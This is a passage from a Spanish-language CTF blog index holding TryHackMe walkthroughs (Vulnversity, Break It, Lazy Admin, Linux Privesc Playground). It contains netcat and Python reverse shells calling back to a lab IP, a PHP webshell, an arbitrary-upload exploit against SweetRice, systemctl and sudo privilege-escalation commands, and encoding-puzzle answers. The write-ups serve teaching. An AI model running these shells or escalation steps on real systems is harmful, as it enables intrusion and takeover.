/tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/shell.sh   Creamos un servicio y lo ejecutamos con systemctl.\n1 2 3 4 5 6 7 8 9 10  TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;bash /tmp/shell.sh\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF   Obtenemos una shell con el usuario root.\n","description":"Vulnversity es una maquina de TryHackMe, es una maquina del PATH de Complete Beginner, aca se muestra la solucion para cada una de las secciones.","id":121,"section":"posts","tags":["suid"],"title":"TryHackMe - Vulnversity","uri":"https://sckull.github.io/posts/vulnversity/"},{"content":"  Break It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.\nRoom    Titulo Break it      Descripción Can you break the code?   Puntos 360   Dificultad Media   Maker DesKel     Codificacion en Base    Base Ejemplo: \u0026ldquo;breakit\u0026rdquo;     Base2 01100010 01110010 01100101 01100001 01101011 01101001 01110100   Base8 142 162 145 141 153 151 164   Base16 62 72 65 61 6b 69 74   Base32 MJZGKYLLNF2A====   Base58 4jP4KDubX1   Base62 22udqyscMu   Base64 YnJlYWtpdA==   Base85 @WH$gCM@k   Base91 %zmfv;:YH    Encriptacion Cipher    Cipher Ejemplo: \u0026ldquo;breakit\u0026rdquo;     Caesar Cipher iylhrpa (shift 7)   Vigenere Cipher uyqtrum (key: thm)    Decodificadores   Hex Workshop\n  CyberChef\n  dcode\n  cryptii\n  Base85.io\n  { Fase 01 - Base } #1 [Super easy] Reto\nMVQXG6K7MJQXGZJTGI====== Solucion\n1 2 3  sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo MVQXG6K7MJQXGZJTGI====== | base32 -d easy_base32 sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$   #2[Easy] Reto\nTVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 Solucion\n1 2 3  sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo TVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 | base64 -d| base32 -d double_bases sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$   #3[Moderate] Reto\nGM4HOU3VHBAW6OKNJJFW6SS2IZ3VAMTYORFDMUC2G44EQULIJI3WIVRUMNCWI6KGK5XEKZDTN5YU2RT2MR3E45KKI5TXSOJTKZJTC4KRKFDWKZTZOF3TORJTGZTXGNKCOE====== Solucion\nBase32 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=R000SE9VM1ZIQkFXNk9LTkpKRlc2U1MySVozVkFNVFlPUkZETVVDMkc0NEVRVUxJSkkzV0lWUlVNTkNXSTZLR0s1WEVLWkRUTjVZVTJSVDJNUjNFNDVLS0k1VFhTT0pUS1pKVEM0S1JLRkRXS1pUWk9GM1RPUkpUR1pUWEdOS0NPRT09PT09PQ #4[Hard] Reto\nHRBUGQDUHFWDIXKUIBWXIJTHIE3DCY3BIE2FKQSZHNDE6MRUIA2TWWDMHRBV2ZKCHQWFCTLPIE2EEJDBIBZCEW3OHUSTOLRCHNFGMVC6IFJXIQ2AHVMVONSBHVOVIM2MHVPV42J4HQVCQ4REIFHVIJ2WHFWDYQSUHROGILJCIFIU23CXHNCEIXK2HRDVSXKOHV2SQJLC Solucion\nBase85 \u0026gt; Base85 \u0026gt; base32 \u0026gt; base85 \u0026gt; base64 \u0026gt; base58 \u0026gt; base85 \u0026gt; base64 \u0026gt; base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85('!-u')From_Base32('A-Z2-7%3D',false)From_Base85('!-u')From_Base64('A-Za-z0-9%2B/%3D',true)From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Base85('!-u')From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=ODVfY1M3bztaUzg0SFpLOFFcVmM4Tz9LXDhQMnJROE9ZRic2V2wzMzhPWUMoOTJTVms4NTtRQTJHSShMOE81KzI9JyVkYTg1X2NUMTBSPTw4NVdHWDZXP2BVOE9ZQyc3N29zNzhPP1RKNzk7OUA4NiZTZjpKPVlSODU7V0U5aWFWPjhPYzxTOFBxNi84Ni9HYzpKT2hUODYvTWU4UExzNzg2L1BmMWJxWls4NVdEVDspRDA%2BOE9jNk84UDFhPjg0SFpLPV0mKnQ4NWA1UjhQRGBEOE9jOU8xLEQ6Ijg1O05AOFFcVkA4NV9pVjtjbFtnODYuS0U7K2FNTA #5[Insane] Reto - Pastebin\nPastebin\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base91 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\n[Solucion - CyberChef, dcode.fr]\n1- Base32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; Base16\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)From_Base85('!-u')From_Decimal('Space',false)From_Hex('Auto')\u0026amp;input= 2- Base91\naE8aZL9YYk4vQt1Zd7yaxV77wCZNkkD9DhEiAnujqBWRzyYphzsb6PVBZtCNPg9K4Sxctp2dvV76p1Qho73sLDqXvhFkNYQ4ovG5GdcWrR1wqTUCsNXBQTkpxE16j9KKqbGoSvajW4pZds8Rm2cLvuAwHxBw9BLafyUYP6NKZ9v8khk3zMvDQGDkdac3EHUy11BDEBDLM3uMNJBvqUKCprznqvBz8WhtstapDVE3CamkyBNRY4d7i92jgp4mefw8ntHEcin4kUH8CXZJHLUZGytcbGPNPatrsGPCS5L7mfRrqMPbVY21CTDmQs7qesrELzuhh7bDHqh7nk1SAqFcQj37c55PxejBMf5efP2Ju7kf1YwCu7Ac9VFVUtYQrm32UEkWihj5i2HASAZaAJ1ZWBWLwyUBJav8HH7FwCA3NzqVd5vsmTbGNk3Fb2EqeG5G1Xhn7ZQAH3RfmcnzA98RT4wgqEN7jVHhiJdZa5pgyS8bCNC56tXpn9sfrqpNhoT3mX87heTmn6p5t4BecT85PRgezBmwHgCbU5GPunkisbPtnP1PxmkWgYZ5o2c9MyyQG9osEy8JrSyZQpE5DHyHMWQnKLKAQLawq5uKjZJNQEcpmqHKRDApPfJF4VjQPiVShy9qcuFXEsApUGJ2oFkH5TziVYxsmeZSb5yg1qYJ9jN8XE4T3GBh64Jkt6YUvDFPGJh2moZW5TjSpKt9M5Jdj9qF2twkAUFDSZDNadD2Hm9iT6fBHnaortu4ENchFs91JFNWhP1MomRgYaj9u 3- Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)From_Decimal('Space',false)From_Hex('Space')\u0026amp;input=YUU4YVpMOVlZazR2UXQxWmQ3eWF4Vjc3d0NaTmtrRDlEaEVpQW51anFCV1J6eVlwaHpzYjZQVkJadENOUGc5SzRTeGN0cDJkdlY3NnAxUWhvNzNzTERxWHZoRmtOWVE0b3ZHNUdkY1dyUjF3cVRVQ3NOWEJRVGtweEUxNmo5S0txYkdvU3Zhalc0cFpkczhSbTJjTHZ1QXdIeEJ3OUJMYWZ5VVlQNk5LWjl2OGtoazN6TXZEUUdEa2RhYzNFSFV5MTFCREVCRExNM3VNTkpCdnFVS0NwcnpucXZCejhXaHRzdGFwRFZFM0NhbWt5Qk5SWTRkN2k5MmpncDRtZWZ3OG50SEVjaW40a1VIOENYWkpITFVaR3l0Y2JHUE5QYXRyc0dQQ1M1TDdtZlJycU1QYlZZMjFDVERtUXM3cWVzckVMenVoaDdiREhxaDduazFTQXFGY1FqMzdjNTVQeGVqQk1mNWVmUDJKdTdrZjFZd0N1N0FjOVZGVlV0WVFybTMyVUVrV2loajVpMkhBU0FaYUFKMVpXQldMd3lVQkphdjhISDdGd0NBM056cVZkNXZzbVRiR05rM0ZiMkVxZUc1RzFYaG43WlFBSDNSZm1jbnpBOThSVDR3Z3FFTjdqVkhoaUpkWmE1cGd5UzhiQ05DNTZ0WHBuOXNmcnFwTmhvVDNtWDg3aGVUbW42cDV0NEJlY1Q4NVBSZ2V6Qm13SGdDYlU1R1B1bmtpc2JQdG5QMVB4bWtXZ1laNW8yYzlNeXlRRzlvc0V5OEpyU3laUXBFNURIeUhNV1FuS0xLQVFMYXdxNXVLalpKTlFFY3BtcUhLUkRBcFBmSkY0VmpRUGlWU2h5OXFjdUZYRXNBcFVHSjJvRmtINVR6aVZZeHNtZVpTYjV5ZzFxWUo5ak44WEU0VDNHQmg2NEprdDZZVXZERlBHSmgybW9aVzVUalNwS3Q5TTVKZGo5cUYydHdrQVVGRFNaRE5hZEQySG05aVQ2ZkJIbmFvcnR1NEVOY2hGczkxSkZOV2hQMU1vbVJnWWFqOXU { Fase 02 - Base, Cipher } #1[Easy] Reto\nPJXHQ4S7GEZV6ZTDOZQQ==== Solucion\nBase32 \u0026gt; Caesar Cipher (Shift 13) \u0026gt; \u0026quot;make_13_spin\u0026quot;\n1- Base32\nznxr_13_fcva 2- Caesar Cipher (shift 13)\nmake_13_spin #2 [Moderate] Reto\nNjZMKVhATl1EcEI2Jio4Q0xuVy1EZSo5ZkFLV0M6QVUtPFpGQ0InIkReYg== Solucion\nBase64 \u0026gt; Base85 \u0026gt; Vigenere Decode (key: tango)\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base85('!-u')Vigen%C3%A8re_Decode('tango')\u0026amp;input=TmpaTUtWaEFUbDFFY0VJMkppbzRRMHh1VnkxRVpTbzVaa0ZMVjBNNlFWVXRQRnBHUTBJbklrUmVZZz09 #3 [Hard] Reto\n-!r/X,]n/Z-Zs\\X,X$,rI\u0026lt;@]#-9Oh,-=A]R-p9\\+ Solucion\nBase85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 \u0026gt; Caesar cipher ( shift 13) \u0026gt; qrpbqr_naq_ebg \n1- Base85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85('!-u')ROT47(47)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',true)\u0026amp;input=LSFyL1gsXW4vWi1ac1xYLFgkLHJJPEBdIy05T2gsLT1BXVItcDlcKw 2- Caesar Cipher (shift 13)\nqrpbqr_naq_ebg #4 [Insane] Reto - Pastebin\nPastebin\nyou are a real code cracker\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base91 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 \u0026gt; Vigenere Cipher \n1- Base32 \u0026gt; Base85 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Base85('!-u')\u0026amp;input=R1pYU01QS1hINFJHRTRUS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FTWlNGWTRWS01LVUdaWFNJMkRMSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZDVzRPQ09JRTJTSVpUQUdRU1NDSkxGR0JVVUdLSkpGVTRUNEozTkZOT1VHTTJCRlk0VktNS1VHWlhTTVBLWEg0UkdFNFRLR1FTVktZUzNITlFWTVhSTUdFVkZHTDJOSUUyU0lJS01JRklXT1FUUkdCVVVHS0pKRlU0VDRKM05JTVhXTVNKR0ZZNFZLTUtVR1pYU01QS1hGVVJUS05KVkdRU1ZLWVMzSE5RVk1YUk1HRlFUSVFLUElFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FUUlRGWTRWS01LVUdaWFNNUEtYRlVSVEtOSlZHUVNWS1lTM0hOUVZNWFJNR0ZDVzRPQ09JRTJTR0xLRElGSVdRWTJGR0JVVUdLSkpGVTRUNFhSS0ZOT1VHS1I2Rlk0VktNS1VHUk5DSVgyU0g0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdCU0RRSlNNSUUyU0dRU0lJRklXU1FLUkdCVVVHS0pKRlU0VDRVUkdGTk9VR00yQkZZNFZLTUtVR1pYU0kzQ0tJUVhUVTRKSkdRU1ZLWVMzSUEzU1VSUzZHRlFUSVFLUElFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0WFJLRk5PVUdNMkJGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZRVElRS1BJRTJTR0xLRElGSVdTVTJaR0JVVUdLSkpGVTRUMjRESklGSVNRU1pTRlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdGUVRJUUtQSUUyU0dMS0RHUkNXQVpSSEdCVVVHS0pKRlU0VDRKM05GTk9VR0tSNkZZNFZLTUtVSFJFUzJZMk9IUlJUU1hMS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNJSUtNSUZJV09RVFJHQlVVR0tKSkZVNFQ0SjNORk5PVUtYQlNGWTRWS01LVUhSRVMyWTJPSFJSVFNYTEtHUVNWS1lTM0lBM1NVUlM2R0ZDVzRPQ09JRTJTSUlLTUlGSVdRUkpaR0JVVUdLSkpGVTRUMjRESkZOT1VLWEJTRlk0VktNS1VHWlhTSTJETEhSUlRTWExLR1FTVktZUzNJRkhVQzJUQ0dGQ1c0T0NPSUUyU0lJS01HUkNXRVVTWUdCVVVHS0pKRlU0VDI0REpJRklTUVRSVEZZNFZLTUtVR1JOQ0lYMlNJQllXMlgzU0dRU1ZLWVMzSFVTRzRMSlFKQTNFNlpLQUlFMlNJSUtNR1FTU0NKTEZHQlVVR0tKSkZVNFQ0VVJHSU1YV01TSkdGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdPUVRSR0JVVUdLSkpGVTRUMjRESkZOT1VHS1I2Rlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNJQTNTU01SMkdJVFU2U1NRSUUyU0lJS01JRklXU1FLUkdCVVVHS0pKRlU0VDI0REpJRklTUVNaU0ZZNFZLTUtVR1pYU01QS1hHUVVVUVhLTkdRU1ZLWVMzSFVTRzRMSlFHRkNXNE9DT0lFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0VVJHR1paRlVLTElGWTRWS01LVUdSTkNJWDJTSDRSR0U0VEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdTUUtSR0JVVUdLSkpGVTRUNFhSS0ZOT1VHTEo3Rlk0VktNS1VHUk5DSVgyU0lCWVcyWDNTR1FTVktZUzNISkVUNk9SSUk1WURJWEI3SUUyU0laVEFJRklXU1UyWkdCVVVHS0pKRlU0VDRYUktJRklTUVJLUA 2- Base91\n53 50 32 51 49 32 53 53 32 51 48 32 53 49 32 53 55 32 51 49 32 52 56 32 53 50 32 52 54 32 52 54 32 52 70 32 53 54 32 52 56 32 53 53 32 51 49 32 53 54 32 52 55 32 54 56 32 55 53 32 54 50 32 53 53 32 53 50 32 54 56 32 53 65 32 54 66 32 51 53 32 55 56 32 54 49 32 53 56 32 54 52 32 51 48 32 52 70 32 53 56 32 54 67 32 52 53 32 52 69 32 51 49 32 52 54 32 52 51 32 52 69 32 54 65 32 52 53 32 51 51 32 53 49 32 55 65 32 52 65 32 51 49 32 54 52 32 53 51 32 52 49 32 54 70 32 54 49 32 51 50 32 53 54 32 51 53 32 52 70 32 54 57 32 52 50 32 51 48 32 53 57 32 53 55 32 51 53 32 54 69 32 54 50 32 51 50 32 53 50 32 55 54 32 54 52 32 51 50 32 51 52 32 55 48 3- Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 - (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=NTMgNTAgMzIgNTEgNDkgMzIgNTMgNTMgMzIgNTEgNDggMzIgNTMgNDkgMzIgNTMgNTUgMzIgNTEgNDkgMzIgNTIgNTYgMzIgNTMgNTAgMzIgNTIgNTQgMzIgNTIgNTQgMzIgNTIgNzAgMzIgNTMgNTQgMzIgNTIgNTYgMzIgNTMgNTMgMzIgNTEgNDkgMzIgNTMgNTQgMzIgNTIgNTUgMzIgNTQgNTYgMzIgNTUgNTMgMzIgNTQgNTAgMzIgNTMgNTMgMzIgNTMgNTAgMzIgNTQgNTYgMzIgNTMgNjUgMzIgNTQgNjYgMzIgNTEgNTMgMzIgNTUgNTYgMzIgNTQgNDkgMzIgNTMgNTYgMzIgNTQgNTIgMzIgNTEgNDggMzIgNTIgNzAgMzIgNTMgNTYgMzIgNTQgNjcgMzIgNTIgNTMgMzIgNTIgNjkgMzIgNTEgNDkgMzIgNTIgNTQgMzIgNTIgNTEgMzIgNTIgNjkgMzIgNTQgNjUgMzIgNTIgNTMgMzIgNTEgNTEgMzIgNTMgNDkgMzIgNTUgNjUgMzIgNTIgNjUgMzIgNTEgNDkgMzIgNTQgNTIgMzIgNTMgNTEgMzIgNTIgNDkgMzIgNTQgNzAgMzIgNTQgNDkgMzIgNTEgNTAgMzIgNTMgNTQgMzIgNTEgNTMgMzIgNTIgNzAgMzIgNTQgNTcgMzIgNTIgNTAgMzIgNTEgNDggMzIgNTMgNTcgMzIgNTMgNTUgMzIgNTEgNTMgMzIgNTQgNjkgMzIgNTQgNTAgMzIgNTEgNTAgMzIgNTMgNTAgMzIgNTUgNTQgMzIgNTQgNTIgMzIgNTEgNTAgMzIgNTEgNTIgMzIgNTUgNDg 4- Vigenere Cipher\nroh gfh o nrtl purh qnnvkrx (key: tangodown) { Fase 03 - Base, Cipher, Bit Shift } #1 [Moderate] Reto\n2D 37 2B 19 31 99 31 B3 B2 AB A5 18 32 37 20 B3 B2 AC 2D 1A 31 B4 A1 3A A4 A3 9C B4 AD 36 AC 9E Solucion\nBlock Shift Left (1 vez) \u0026gt; Base64 \u0026gt; ROT13\n1- Bock Shift Left\n2- Base64 \u0026gt; ROT13 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)ROT13(true,true,13)\u0026amp;input=Wm5WMmMyY2dlV0owZG5BZ2VYWjRjaUJ1SUc5aVptWT0 #2 [Hard] Reto\n19 1A 1C 99 1C 9C A8 38 27 B2 34 27 B9 27 26 28 3C 3B AA 28 A5 AA 2A 29 3C 29 B2 B2 21 B1 AC A6 1C AC 29 A8 38 99 2C Solucion\nHex Workshop \u0026gt; new \u0026gt; Paste Special \u0026gt; CF_TEXT Marcar 'Interpret as a hexadecimal string' \u0026gt; Rotate to the left 8 bits \u0026gt; Base 58 \u0026gt; Caesar Cipher Shift 14\n1- Hex Workshop - Rotate Left 8 bits\n2- Base 58\n248389QpNehNsNLPxvUPKUTRxReeBcYM8YRQp3X 3- Caesar Cipher Shift 14 (dcode.fr)\nfuvsg nevguzrgvp yvxr n obff #3 [Insane] Reto\nA9 A8 2B EE 2A AA C9 C8 C9 AA A8 0F 2A 8A AA EE A9 8A CA A8 A9 4F 6D 46 E9 A8 A8 0F A9 8A 6D 86 A9 AA A9 26 2A 8A 48 E8 Solucion\nRotate to the left 8 bits (3 veces) \u0026gt; Base64 \u0026gt; Block Shift Left (2 veces) \u0026gt; Base85 \u0026gt; Caesar Cipher (Shift 13)\n1- Rotate to the left 8 bits (3 veces)\nMEYwQUNFNUExQTUwMTVEMzk2OEExMTk4MUM1QTBG 2- Base64\n0F0ACE5A1A5015D3968A11981C5A0F 3- Block Shift Left (2 veces)\n\u0026lt;+9hi@WNZ(F`qh\u0026lt; 4- Base85\nTbq bs fuvsf 5- Caesar Cipher (Shift 13)\nGod of shifs ","description":"Break It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.","id":122,"section":"posts","tags":["challenge"],"title":"TryHackMe - Break It","uri":"https://sckull.github.io/posts/breakit/"},{"content":"  Lazy Admin es una maquina de TryHackMe, descubrimos una base de datos y una vulnerabilidad en SweetRice. Ejecutamos una shell inversa con Sudo y Perl.\nRoom    Titulo LazyAdmin      Descripción Easy linux machine to practice your skills   Puntos 110   Dificultad Facil   Maker MrSeth6797     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-12 04:49:57 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.68.91 Discovered open port 80/tcp on 10.10.68.91 # Nmap 7.80 scan initiated Wed Dec 11 22:50:33 2019 as: nmap -sV -sC -o nmap_scan 10.10.68.91 Nmap scan report for 10.10.68.91 Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 11 22:51:22 2019 -- 1 IP address (1 host up) scanned in 48.56 seconds   WHATWEB Vemos que la pagina esta corriendo sobre un Apache 2.4.18.\nHTTP Al visitar la pagina nos muestra el tipico index de apache.\nGOBUSTER Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.\n1 2 3 4 5 6  root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /content (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/lazyadmin#   Sweet Rice CMS /content Encontramos un CMS especificamente Sweet Rice, con un mensaje que indica que el sitio web esta en construccion.\nPasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /_themes (Status: 301) /as (Status: 301) /attachment (Status: 301) /changelog.txt (Status: 200) /images (Status: 301) /inc (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /license.txt (Status: 200) root@aoiri:~/tryhackme/lazyadmin#   Una direccion interesante es /as, contiene un panel de logeo, intentamos utilizar las credenciales por default pero no logramos acceder.\nBuscamos exploits que pudiesen afectar a este gestor de contenidos y encontramos distintas vulnerabilidades.\nSweetRice 1.5.1 - Backup Disclosure Una de ellas indica que existe un backup de mysql en el directorio /inc/mysql directorio que existe en esta pagina.\nDescargamos el archivo y al analizarlo encontramos que se hizo una insersion en la tabla options donde encontramos un nombre y una contraseña, las cuales podemos utilizar en el panel de logeo.\nBuscamos el hash en crackstation y obtuvimos la contraseña en texto plano:\nCredenciales:\nUser: manager Password: Password123 SweetRice 1.5.1 - Arbitrary File Upload Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (lazyadmin.thm en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos /content/ a los valores que contienen /as/ y /attachment/.\nCreamos un archivo en php de prueba:\n1  echo \u0026#34;\u0026lt;?php echo \u0026#39;:D\u0026#39;; ?\u0026gt;\u0026#34; \u0026gt; shellfoo.php5   Ejecutamos y vemos que se subio nuestro archivo:\nNuestro archivo de prueba:\nSubimos una webshell:\n1 2 3 4 5 6 7 8 9  \u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; } ?\u0026gt;   Ejecutamos un comando para obtener una shell inversa:\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.1.72\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   USER - Flag Nos movemos a la carpeta principal del usuario itguy y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion rapida con el comando sudo -l -l, y vemos que hay un archivo que podemos ejecutar con perl con el comando sudo, a su vez este archivo ejecuta otro (/etc/copy.sh), este ultimo ejecuta un comando para obtener una shell inversa hacia una IP.\n/home/itguy/backup.pl\n1 2 3  #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;);   copy.sh\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f   El archivo backup.pl no puede ser modificado, pero el archivo copy.sh si, hicimos una pequeña prueba con un comentario en bash.\n1  echo \u0026#34;#foo\u0026#34; \u0026gt;\u0026gt; /etc/copy.sh   Permisos copy.sh:\nAgregamos una shell inversa al archivo copy.sh:\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /etc/copy.sh   Ejecutamos y obtenemos una shell inversa con el usuario root, junto con nuestra flag root.txt.\nFirefox Decrypt Dentro de la carpeta principal del usuario itguy encontramos la carpeta .mozilla/firefox/, utilizamos firefox_decrypt para obtener las contraseñas y usuarios guardados.\n","description":"Lazy Admin es una maquina de TryHackMe, descubrimos una base de datos y una vulnerabilidad en SweetRice. Ejecutamos una shell inversa con Sudo y Perl.","id":123,"section":"posts","tags":["SweetRice","firefox"],"title":"TryHackMe - Lazy Admin","uri":"https://sckull.github.io/posts/lazyadmin/"},{"content":"  Linux Privesc Playground es una maquina de TryHackMe que presenta distintos ficheros SUID para practicar escalar privilegios en Linux.\nRoom    Titulo Linux Privesc Playground      Descripción A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos *   Dificultad Facil   Maker SherlockSec     Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.\nLas credenciales de la maquina:\n1  user:password   Para poder enumerar los ficheros del tipo SUID podemos utilizar los siguientes comandos:\n1 2 3  find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -u=s -type f 2\u0026gt;/dev/null   De igual forma podemos utilizar sudo para poder ver que ficheros pueden ser ejecutados bajo el comando sudo.\n1  sudo -l -l   Podemos ver que nos devuelve una lista de ficheros los cuales pueden ser utilizados para obtener privilegios de root.\nA continuacion se listan la solucion para alguno de ellos, se puede encontrar los comandos en la pagina GTFOBINS.\n/bin/apt-get* En el caso de este fichero al consultar sobre la existencia en el directorio que nos muestra el listado no existe en esa direccion. Utilizamos cp para copiar el acrhivo y lo colocamos en la direccion /bin/.\nComando:\n1  sudo /bin/apt-get update -o APT::Update::Pre-Invoke::= /bin/bash   /usr/bin/aria2c Ya que podemos ejecutar este archivo con el comando sudo, podemos aprovechar las diferentes opciones que tiene el archivo. aria2c en su version 1.13.0.\nComando:\n1  sudo /usr/bin/aria2c -i /root/flag.txt   /usr/sbin/arp Comando:\n1  LFILE=/root/flag.txt; sudo arp -v -f \u0026#34;$LFILE\u0026#34;   /bin/ash Comando:\n1  sudo /bin/ash   /usr/bin/awk Comando:\n1  sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;   /usr/bin/base64 Comando:\n1 2  LFILE=/root/flag.txt sudo 